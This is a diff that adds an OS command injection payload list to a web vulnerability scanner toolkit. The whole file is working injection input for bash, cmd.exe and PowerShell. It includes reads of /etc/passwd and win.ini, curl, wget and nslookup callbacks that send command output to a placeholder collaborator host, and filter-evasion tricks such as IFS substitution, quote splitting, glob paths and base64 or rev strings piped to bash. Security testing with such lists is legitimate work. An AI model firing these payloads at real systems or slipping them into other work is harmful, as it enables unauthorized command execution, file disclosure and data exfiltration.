@@ -1,0 +1,288 @@
+# =============================================================================
+# OS Command Injection Payloads
+# justdastit DAST toolkit
+# =============================================================================
+# Categories: Chained operators, backtick, subshell, blind, newline,
+#             IFS bypass, wildcard, Windows cmd.exe, PowerShell
+# =============================================================================
+
+# -----------------------------------------------------------------------------
+# BASIC CHAINED OPERATORS — Linux/bash
+# -----------------------------------------------------------------------------
+;id
+;id;
+|id
+||id
+&&id
+;id|
+`id`
+$(id)
+;ls
+|ls
+||ls
+&&ls
+;cat /etc/passwd
+|cat /etc/passwd
+||cat /etc/passwd
+&&cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+;uname -a
+|uname -a
+||uname -a
+&&uname -a
+;whoami
+|whoami
+||whoami
+&&whoami
+`whoami`
+$(whoami)
+
+# With leading space/value
+a;id
+a|id
+a||id
+a&&id
+a`id`
+a$(id)
+1;id
+1|id
+1||id
+1&&id
+
+# -----------------------------------------------------------------------------
+# SEMICOLON AND PIPE VARIATIONS
+# -----------------------------------------------------------------------------
+;id #
+;id #comment
+;id%00
+|id%00
+;id%0a
+|id%0a
+;id%0d%0a
+|id%0d%0a
+;{id}
+|{id}
+;(id)
+|(id)
+;$({id})
+;`{id}`
+
+# -----------------------------------------------------------------------------
+# NEWLINE INJECTION
+# -----------------------------------------------------------------------------
+%0aid
+%0d%0aid
+%0a id
+%0a/usr/bin/id
+%0awhoami
+%0d%0awhoami
+\nid
+\n/usr/bin/id
+\r\nid
+%0a%0did
+\x0aid
+
+# -----------------------------------------------------------------------------
+# BACKTICK AND SUBSHELL EXECUTION
+# -----------------------------------------------------------------------------
+`id`
+`whoami`
+`cat /etc/passwd`
+`uname -a`
+`ls -la`
+$(id)
+$(whoami)
+$(cat /etc/passwd)
+$(uname -a)
+$(ls -la)
+$((1+1))
+x`id`x
+x$(id)x
+"`id`"
+"$(id)"
+'`id`'
+
+# -----------------------------------------------------------------------------
+# BLIND COMMAND INJECTION — Time-based
+# -----------------------------------------------------------------------------
+;sleep 5
+|sleep 5
+||sleep 5
+&&sleep 5
+`sleep 5`
+$(sleep 5)
+;sleep 5 #
+|sleep 5 #
+;sleep${IFS}5
+|sleep${IFS}5
+;/usr/bin/sleep 5
+|/usr/bin/sleep 5
+$(sleep${IFS}5)
+`sleep${IFS}5`
+%0asleep 5
+;ping -c 5 127.0.0.1
+|ping -c 5 127.0.0.1
+||ping -c 5 127.0.0.1
+&&ping -c 5 127.0.0.1
+$(ping -c 5 127.0.0.1)
+`ping -c 5 127.0.0.1`
+;sleep 10
+|sleep 10
+;sleep 21
+
+# Blind — DNS/HTTP exfiltration markers
+;nslookup BURP_COLLAB_MARKER
+|nslookup BURP_COLLAB_MARKER
+`nslookup BURP_COLLAB_MARKER`
+$(nslookup BURP_COLLAB_MARKER)
+;curl http://BURP_COLLAB_MARKER
+|curl http://BURP_COLLAB_MARKER
+`curl http://BURP_COLLAB_MARKER`
+$(curl http://BURP_COLLAB_MARKER)
+;wget http://BURP_COLLAB_MARKER
+|wget http://BURP_COLLAB_MARKER
+$(wget http://BURP_COLLAB_MARKER)
+;curl http://BURP_COLLAB_MARKER/$(whoami)
+;nslookup $(whoami).BURP_COLLAB_MARKER
+
+# -----------------------------------------------------------------------------
+# OUTPUT MARKERS — Wrap output for detection
+# -----------------------------------------------------------------------------
+;echo CMDI_START$(id)CMDI_END
+|echo CMDI_START$(id)CMDI_END
+;echo CMDI_START`id`CMDI_END
+|echo CMDI_START`id`CMDI_END
+;echo CMDI_START;id;echo CMDI_END
+|echo CMDI_START&&id&&echo CMDI_END
+$(echo CMDI_START)$(id)$(echo CMDI_END)
+
+# -----------------------------------------------------------------------------
+# IFS BYPASS — Substitute spaces
+# -----------------------------------------------------------------------------
+;cat${IFS}/etc/passwd
+|cat${IFS}/etc/passwd
+;cat$IFS/etc/passwd
+;{cat,/etc/passwd}
+;cat</etc/passwd
+;cat$'\x20'/etc/passwd
+;X=$'cat\x20/etc/passwd'&&$X
+;IFS=,;`cat<<</etc/passwd`
+${IFS}id
+;id${IFS}
+cat${IFS}/etc${IFS}/passwd
+;ls${IFS}-la
+;ping${IFS}-c${IFS}5${IFS}127.0.0.1
+
+# -----------------------------------------------------------------------------
+# WILDCARD / GLOB INJECTION
+# -----------------------------------------------------------------------------
+;cat /etc/pas*
+;cat /etc/pass??
+;cat /etc/p?sswd
+;ls /etc/pas*
+;/???/?????? /???/??????
+;/???/??t /???/??????
+;/???/??n/id
+
+# -----------------------------------------------------------------------------
+# FILTER BYPASS TECHNIQUES
+# -----------------------------------------------------------------------------
+# String concatenation
+;c'a't /etc/passwd
+;c"a"t /etc/passwd
+;c\at /etc/passwd
+;ca$()t /etc/passwd
+;w'h'o'a'm'i
+;w"h"o"a"m"i
+;/b\in/ca\t /e\tc/pas\swd
+
+# Hex / octal encoding
+;$(printf '\x69\x64')
+;$(printf '\151\144')
+;$'\x69\x64'
+;echo$IFS$'\x63\x61\x74'$IFS'/etc/passwd'|$0
+
+# Base64 encoding
+;echo aWQ=|base64 -d|bash
+;echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash
+;bash<<<$(echo aWQ=|base64 -d)
+$(echo aWQ=|base64 -d)
+`echo aWQ=|base64 -d`
+
+# Rev bypass
+;echo 'di' | rev | bash
+;echo 'dwssap/cte/ tac' | rev | bash
+
+# Variable substitution bypass
+;a=i;b=d;$a$b
+;a=ca;b=t;c=/etc/passwd;$a$b $c
+;a=who;b=ami;$a$b
+
+# -----------------------------------------------------------------------------
+# WINDOWS cmd.exe PAYLOADS
+# -----------------------------------------------------------------------------
+& whoami
+| whoami
+|| whoami
+&& whoami
+& dir
+| dir
+|| dir
+&& dir
+& type C:\Windows\win.ini
+| type C:\Windows\win.ini
+& ipconfig
+| ipconfig
+& net user
+| net user
+& systeminfo
+| systeminfo
+& hostname
+| hostname
+& ver
+| ver
+& type C:\boot.ini
+| type C:\boot.ini
+&& type C:\Windows\System32\drivers\etc\hosts
+
+# Windows blind
+& ping -n 5 127.0.0.1
+| ping -n 5 127.0.0.1
+|| ping -n 5 127.0.0.1
+&& ping -n 5 127.0.0.1
+& timeout /t 5
+| timeout /t 5
+
+# Windows newline
+%0adir
+%0d%0adir
+%0awhoami
+%0d%0awhoami
+
+# Windows cmd concatenation bypass
+&w^h^o^a^m^i
+|w^h^o^a^m^i
+& s^e^t
+& se"t"
+& "whoami"
+
+# -----------------------------------------------------------------------------
+# POWERSHELL PAYLOADS
+# -----------------------------------------------------------------------------
+; powershell -c "whoami"
+| powershell -c "whoami"
+& powershell -c "whoami"
+; powershell -c "Get-Process"
+| powershell -c "Get-Process"
+; powershell -c "Get-Content C:\Windows\win.ini"
+| powershell -c "Get-Content C:\Windows\win.ini"
+; powershell -c "Start-Sleep -s 5"
+| powershell -c "Start-Sleep -s 5"
+; powershell -c "Invoke-WebRequest http://BURP_COLLAB_MARKER"
+| powershell -c "Invoke-WebRequest http://BURP_COLLAB_MARKER"
+; powershell -enc dwBoAG8AYQBtAGkA
+| powershell -enc dwBoAG8AYQBtAGkA
+; pwsh -c "id"
+| pwsh -c "id"
+$(powershell -c "whoami")
